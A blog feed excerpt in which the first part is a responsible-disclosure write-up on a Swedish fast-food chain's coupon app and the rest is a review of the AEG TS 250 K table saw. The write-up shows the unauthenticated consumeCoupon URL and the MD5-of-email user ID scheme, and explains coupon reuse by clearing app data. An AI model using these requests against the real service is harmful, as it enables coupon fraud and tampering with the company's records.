    &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10kr rabatt mjukglass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;imageUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://sibylla.se/PageFiles/6305/10kr_rabatt_mjukglass.png&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="err"&gt;//&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt; &lt;span class="err"&gt;and&lt;/span&gt; &lt;span class="err"&gt;so&lt;/span&gt; &lt;span class="err"&gt;on&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the user specific query (getAllCouponsForUser) returns something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pageId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1969&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-06-28 09:16&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;stoppublish&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-09-03 00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Super Meal 2 fÃ¶r 99kr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Super Meal 2 fÃ¶r 99kr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;imageUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://sibylla.se/PageFiles/6301/2_st_Super_Meal_99kr.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;consumed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pageId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1970&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-06-28 09:16&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;stoppublish&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-09-03 00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10kr rabatt mjukglass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10kr rabatt mjukglass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;imageUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://sibylla.se/PageFiles/6305/10kr_rabatt_mjukglass.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;consumed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
&lt;span class="err"&gt;//&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt; &lt;span class="err"&gt;and&lt;/span&gt; &lt;span class="err"&gt;so&lt;/span&gt; &lt;span class="err"&gt;on&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basically the only difference is the &lt;code&gt;consumed&lt;/code&gt; attribute.&lt;/p&gt;
&lt;h1&gt;Coupons&lt;/h1&gt;
&lt;p&gt;In the app, Sibylla from time to time offer deals on various meals. They way it
works is that you go the "deals" in the app, where you are presented a couple of
different coupons. When you are buying corresponding meal you let the clerk
press the "use coupon" button and then you don't have to pay the full price,
simple and easy!&lt;/p&gt;
&lt;h1&gt;What happens under the hood?&lt;/h1&gt;
&lt;p&gt;When I played around with it and used up a coupon I could see the following
message was sent to &lt;a href="http://sibylla.se"&gt;sibylla.se&lt;/a&gt;: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;consumeCoupon&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;pageId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1975&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;410daeeb1b350a86defb583e08ebbf15
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I.e., something is sent back to their servers indicating that a coupon has been
used and indeed when checking in the app it says that coupon already has been
used and it stays like that even if you kill / restart the app. Two things
caught my attention here.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;pageId&lt;/code&gt;: This is the id for the coupon. Replacing this any other valid
   &lt;code&gt;pageId&lt;/code&gt; from the query posted further up will mark the coupon as used in the
   Sibylla server for a certain user.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;userId&lt;/code&gt;: What is that? It looks like a hash of some sort. Is it a has of
   the &lt;code&gt;userId&lt;/code&gt; for the app? Or the hash of the email? Or something else?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I decompiled the apk-file (using zip,
&lt;a href="https://github.com/pxb1988/dex2jar"&gt;dex2jar&lt;/a&gt; and &lt;a href="http://jd.benow.ca"&gt;jd-gui&lt;/a&gt;)
and then looked up the keyword &lt;code&gt;consumeCoupon&lt;/code&gt;, which revealed:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;UsedDealResponse&lt;/span&gt; &lt;span class="nf"&gt;loadDataFromNetwork&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Builder&lt;/span&gt; &lt;span class="n"&gt;campaignUriBuilder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Uri&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Constants&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;campaignService&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;buildUpon&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="n"&gt;campaignUriBuilder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;appendQueryParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;requestType&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;consumeCoupon&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;campaignUriBuilder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;appendQueryParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pageId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pageId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;campaignUriBuilder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;appendQueryParameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;userId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;campaignUriBuilder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;build&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;m17i&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;URL &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UsedDealResponse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getRestTemplate&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getForObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;UsedDealResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and where &lt;code&gt;userId&lt;/code&gt; seems to come from&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;UseDealsRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;pageId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;super&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UsedDealResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;userId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;m17i&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;MD5 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;userId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pageId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pageId&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There we have it, the &lt;code&gt;userId&lt;/code&gt; is a &lt;code&gt;MD5&lt;/code&gt; sum of something. After some fiddling
I understood that is comes from the string if you used email when logging into
the app. I guess it would be slightly different when using Facebook or Google
login.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    md5&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;email_foo.bar@moo.com&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 410daeeb1b350a86defb583e08ebbf15
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, let's recap:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The app queries the server on start.&lt;/li&gt;
&lt;li&gt;The app sends a &lt;code&gt;consumeCoupon&lt;/code&gt; message to the server when using a coupon,
  but instead of plain email it is using the &lt;code&gt;MD5&lt;/code&gt; of the string "&lt;code&gt;email_...&lt;/code&gt;" as
  the &lt;code&gt;userId&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1&gt;Re-use a coupon?&lt;/h1&gt;
&lt;p&gt;I wondered how they protected against using a coupon more than once. I searched
the decompiled code for other &lt;code&gt;requestType&lt;/code&gt;. But I couldn't find anything
indicating that it was possible to revert a used coupon (server side). But at
the same time, I've noticed that the app uses the email string when starting
the app, but using an &lt;code&gt;MD5&lt;/code&gt; sum of the app when using a coupon. Something
doesn't seem right here. Calling:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;getAllCouponsForUser&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;email_foo.bar@moo.com
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;getAllCouponsForUser&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;410daeeb1b350a86defb583e08ebbf15
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;gives different result. The former tells you that no coupon has been used, but
the latter will indeed tell you that the ones you've used up indeed are marked
as &lt;code&gt;consumed: true&lt;/code&gt;. So, how can the app know that a coupon has been used?
Could it be stored locally? Said and done, I cleared the Sibylla apps data and
cache. Restarted the app, logged in with the same email and voilÃ¡, the app
tells me that the coupon hasn't been used. This must mean that the app is
indeed storing data locally.&lt;/p&gt;
&lt;h1&gt;Reflections&lt;/h1&gt;
&lt;p&gt;I guess a company like Sibylla probably doesn't care too much about this. Since
in the end they're probably happy as long as they sell their fast food and they
probably makes a nice profit even when their customers are using a discount
code or something similar. But, since they walked the extra mile of letting
someone create an app like this, I guess there is some interest of having e
genuine app behaving as expected. There are mainly three things that seems
wrong here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The app stores data at a server, but the app doesn't seem to make use of this
  information. I cannot say whether that is a bug due to using a plain string
  when starting the app and using the &lt;code&gt;MD5&lt;/code&gt; of the string when using a coupon or
  if all this is intentional and the server part is just there for statistics for
  Sibylla marketing.&lt;/li&gt;
&lt;li&gt;It is possible to re-use coupons by just clear the data/cache for the app.&lt;/li&gt;
&lt;li&gt;Since there is no authentication, it is possible to exploit and put false
  information at their server, by just use any combination with &lt;code&gt;userId/pageId&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1&gt;What could and should be done?&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The app should use &lt;code&gt;HTTPS&lt;/code&gt; instead of plain &lt;code&gt;HTTP&lt;/code&gt;. If that would have been
  the case, then this would never caught my attention.&lt;/li&gt;
&lt;li&gt;The email used then logging into the app should be authenticated.&lt;/li&gt;
&lt;li&gt;The server should only accept requests from authenticated users.&lt;/li&gt;
&lt;li&gt;The app should use the data from the server to decide whether a user already
  has used a coupon or not.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This doesn't seem like a super serious issue, but I've given Sibylla knowledge
about it 2018-08-19 and as common practice I'll give them a 90 days to fix the
issues I've found. I.e., somewhere after the 17th November 2018 I'll publish
this article on my site.&lt;/p&gt;</content><category term="Hacking"></category></entry><entry><title>AEG TS 250 K - Table Saw</title><link href="https://jyx.github.io/aeg-ts-250-k-table-saw.html" rel="alternate"></link><published>2015-03-11T20:47:16+01:00</published><updated>2018-08-18T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2015-03-11:/aeg-ts-250-k-table-saw.html</id><summary type="html">&lt;p&gt;&lt;img alt="TS 250 K logo" src="https://jyx.github.io/images/ts250k/ts_logo.jpg" align="right"&gt;
Last year we built a workshop/shed/depot. Since I planned to build a lot of
stuff (in wood) I decided to buy a table saw. My criteria was that it should be
portable and rather easy to put aside when not in use. I'm new to woodworking so
I didn't have any experience and therefore it was a bit hard to know exactly
what to look for when buying a table saw. After looking around a little bit my â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="TS 250 K logo" src="https://jyx.github.io/images/ts250k/ts_logo.jpg" align="right"&gt;
Last year we built a workshop/shed/depot. Since I planned to build a lot of
stuff (in wood) I decided to buy a table saw. My criteria was that it should be
portable and rather easy to put aside when not in use. I'm new to woodworking so
I didn't have any experience and therefore it was a bit hard to know exactly
what to look for when buying a table saw. After looking around a little bit my
choice fell on the table saw from AEG called &lt;a href="http://www.aeg-powertools.eu/woodworking/ts-250-k/ts-250-k/"&gt;AEG TS 250 K&lt;/a&gt;.
This was a chance I took, since I couldn't really find any good review for this
table saw on the net. The table saw itself comes with foldable stand, a 254mm
saw blade which is capable of cutting 90mm in 90 degree cuts and 62 mm at 45
degree cuts. It has soft start and the fence looked quite good. So on paper this
seems like a quite good table ... and it is, but there are some quirks.&lt;/p&gt;
&lt;p&gt;The last couple of months I've read an endless amount of woodworking pages on
the net and I've also watched a substantial amount of woodworking clips on
YouTube, so by now I think I have a pretty good understanding of cross cut
sleds, router fences, drill press tables, cyclone dust collectors etc, you name
it! Quite early on I realized that a cross cut sled would be quite useful. With
a cross cut sled you can get very accurate 90 degree cuts, you can easily
incorporate stop blocks etc and due to this I could most likely also put my
miter saw somewhere so it doesn't occupy my valuable space in the workshop.
Ideally I'd like to have all tools ready to be used, but I simply don't have
that much space. Anyhow, cross cut sled is a key thing to make.&lt;/p&gt;
&lt;h1&gt;Ingredients for a cross cut sled&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;12-18mm thick plywood, MDF or something similar that is hard enough to use for
  the sled base.&lt;/li&gt;
&lt;li&gt;Sled runners made from hardwood (oak, maple, beech etc).&lt;/li&gt;
&lt;li&gt;And some straight pieces of wood for the front and back fence.&lt;/li&gt;
&lt;li&gt;Preferable a routed slot for mounting a t-slot on the back fence.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In principle that's it, sounds simple? It is quite simple, or I should say, it
&lt;em&gt;should&lt;/em&gt; be quite simple.&lt;/p&gt;
&lt;h1&gt;Cutting the sled base&lt;/h1&gt;
&lt;p&gt;Since it's a bit messy in the workshop right now and my plywood sheet was full
size (&lt;code&gt;2450 x 1200&lt;/code&gt;mm) I had to use another saw, my track saw, that is a cheap
copy of &lt;a href="http://www.festoolusa.com/power-tools/track-saws/ts-55-req-plunge-cut-track-saw-561556"&gt;Festools' TS 55 REQ Track Saw&lt;/a&gt;.
It did a good job, so here I didn't really use the AEG table saw. In any case
even if you have the space to handle a full sheet of plywood I think it's pretty
hard to maneuver such a big piece on a table saw that small.&lt;/p&gt;
&lt;h1&gt;Cutting the sled runners&lt;/h1&gt;
&lt;p&gt;The sled runners are the strips of hardwood (preferable) that you put in the
slots in the table saw base. I.e, these are the ones that guides the sled base
when moving it back and forth when cutting your wood pieces.&lt;/p&gt;
&lt;h2&gt;Problem 1 - no standard miter slots!&lt;/h2&gt;
&lt;p&gt;The miter gauge slots on AES TS 250 K are no standard slots! They are almost
19mm wide, but only 6mm deep. What makes this even worse is that the slots
themselves are not really squared. In the bottom, in the middle of the slot,
there is a stripe that is very thin, but still big enough that it makes the slot
non-flat. I guess the intention is to take care of the tiny dust that falls into
the slots that in some cases prevents miter gauges etc so slide easily.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mitre slots" src="https://jyx.github.io/images/ts250k/ts_mitre_slots.jpg" width="760" align="middle"&gt;&lt;/p&gt;
&lt;p&gt;Also at the top, the last 1-2mm of the slot are rounded, which effectively means
that you only have straight side "walls" in the slot that are about 4mm. So, you
don't have much material in the slot when you want to tighten sled runners. On
top of this bad design choice, AEG decided to make three tabs, which I call
"inverted t-slots" see the image above and below and you will understand what
I'm talking about.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mitre slots closeup" src="https://jyx.github.io/images/ts250k/ts_mitre_slot_closeup.jpg" align="middle" width="760"&gt;&lt;/p&gt;
&lt;p&gt;The idea behind this "genius" design is to support the included miter gauge,
which by the way is a piece of crap. There is at least 1mm play when using the
included miter gauge in the slots, which means that it is totally impossible to
get accurate cuts using this gauge regardless how you try to adjust it. The
height of the inverted t-slots are roughly 2-3mm, which leads to you only have
3-4mm between them and the bottom of the miter slot.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mitre gauge gap" src="https://jyx.github.io/images/ts250k/ts_mitre_gauge_gap.jpg" align="middle" width="760"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Mitre gauge gap 2" src="https://jyx.github.io/images/ts250k/ts_mitre_gauge_gap2.jpg" align="middle" width="760"&gt;&lt;/p&gt;
&lt;p&gt;Anyhow, I have also been able to make a quite good router table with a router
fence and micro adjustment capabilities for my router, which means that in
theory, I should be able to route 1mm wide and 3mm deep slots on the side of my
sled runners. But first I needed to do a rough cut of my oak piece that I
intended to use as sled runners in my miter slots.&lt;/p&gt;
&lt;h2&gt;Problem 2 - sloppy, non flat table saw insert&lt;/h2&gt;
&lt;p&gt;The &lt;a href="https://www.google.se/#q=table+saw+insert"&gt;insert&lt;/a&gt; is made out of thin
plastic and seems quite fragile. Also it's made so you should be able to do 45
degree cuts without having the blade nudging the insert. This is good ... and
bad. It's bad because you cannot cut thin strips, since if you try to do this,
they will simply fall down into the table saw in this rather big hole.  Another
thing with this insert that it's not dead flat with the top of the table saw,
which means that thin pieces could tilt a little bit and as an end result you
will get non squared cuts.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Stock insert" src="https://jyx.github.io/images/ts250k/ts_default_insert.jpg" align="middle" width="760"&gt;
&lt;img alt="Insert with bad height" src="https://jyx.github.io/images/ts250k/ts_insert_bad_height.jpg" align="middle" width="760"&gt;
&lt;img alt="Zero insert" src="https://jyx.github.io/images/ts250k/ts_zero_insert.jpg" align="middle" width="760"&gt;&lt;/p&gt;
&lt;p&gt;As seen in the image above, my solution to this problem was to simply create a
new zero play insert made out of plywood instead. It took an hour or so to make
it fit and get the correct height. When that was done I could go back working
on my oak sled runners.&lt;/p&gt;
&lt;h2&gt;Problem 3 - hard to make straight cuts using the fence&lt;/h2&gt;
&lt;p&gt;I still haven't been able to figure out why I cannot make complete straight
cuts. I think it's because of a couple of different reasons. First reason is
probably because I'm a beginner, secondly it seems like the table saw fence have
some play before tightening it and lastly I'm pretty sure that the blade isn't
square to either the slots and/or the fence, more on that later.&lt;/p&gt;
&lt;p&gt;Anyhow, I managed to get the strips to a fairly good size and I also managed to
route the tiny "slots" for the inverted t-slots. So far so good.
&lt;img alt="Oak sled runners" src="https://jyx.github.io/images/ts250k/ts_oak_runners.jpg" align="middle" width="760"&gt;&lt;/p&gt;
&lt;h1&gt;Mounting the sled runners on the sled base&lt;/h1&gt;
&lt;p&gt;This is pretty straight forward, put the runners in the slots, put the sled base
on top of them and the table saw table. Use some screws and/or glue to put them
together. I did that and after doing so I noticed that I barely could move my
sled. So, what was wrong? After some investigation I realized that my sled
runners was a bit too thick in some areas of the slots. So after some fine
tuning and moving the sled back and forth it started to move a little smoother
(but still not as good as I wanted it to be).&lt;/p&gt;
&lt;p&gt;Side note: Later on when creating another sled I realized that the stupid
inverted t-slots are not the same size. Some of them are bigger than others.
After some sanding on the inverted t-slots, directly on the aluminium (both the
height and the width), to make them more equal, things are suddenly running even
more smoothly now.&lt;/p&gt;
&lt;h2&gt;Problem 4 - saw blade and slots are not parallel&lt;/h2&gt;
&lt;p&gt;The rest of the cross cut sled build was pretty straight forward, just "Google"
"how to make a cross cut sled" and you will find several guides of how to do it.
I did walk the extra mile and were using the &lt;a href="https://youtu.be/UbG-n--LFgQ"&gt;5 cut method&lt;/a&gt;
to get the back fence of the sled (almost) perfectly perpendicular to the cut.
Note that I'm saying "the cut", because the cut is not perpendicular to the
table saw blade (see image below). My take is that the table saw slots are not
parallel with the table saw blade. I doesn't really matter when using a cross
cut sled, it's just that the cut will be a little bit wider than the kerf of the
saw blade. However I would prefer having the sleds parallel.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Unaligned blade" src="https://jyx.github.io/images/ts250k/ts_blade_unaligned.jpg" width="760"&gt;&lt;/p&gt;
&lt;h1&gt;Other things that a potential buyer has to be aware of&lt;/h1&gt;
&lt;h2&gt;The Table Top&lt;/h2&gt;
&lt;p&gt;The top of the table is made out of aluminium and the surface is a little bit
rough. It's not a big problem, but you have to be aware of that you cannot use
magnetic tools like the ones used together with a dial indicator. I also don't
think it's very common to have an iron surface on portable table top saws.&lt;/p&gt;
&lt;h2&gt;The Riving knife&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Riving knife height" src="https://jyx.github.io/images/ts250k/ts_riving_height.jpg" align="right" width="399"&gt;&lt;/p&gt;
&lt;p&gt;The riving knife is quite big and follows the saw blade when you raise and lower
your saw blade. That is really good. The downside is that the riving knife also
goes above the saw blade which means that you cannot cut grooves/slots when
having the riving knife mounted. You &lt;em&gt;cannot&lt;/em&gt; adjust this. Either the riving
knife is mounted or it has to be removed. Since I'm really concerned about
safety when it comes to using my table saw, my plan is to cut the riving knife
so it stays just below the height of the saw blade (see the image above).
However by doing so I cannot mount the dust collector / kickback protection
again. This is not a big deal for me, since that is to big and bulky anyway and
having a riving knife is the critical thing to have mounted to prevent kickback.&lt;/p&gt;
&lt;p&gt;The riving knife doesn't come with any quick mount. To remove it you need to
first remove the insert and then you need to unscrew the two hex bolts that
tightens the riving knife. It would be nice if it had the same type of quick
mount that you can find on other table saws.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Riving knife mount" src="https://jyx.github.io/images/ts250k/ts_riving_mount.jpg" width="760"&gt;&lt;/p&gt;
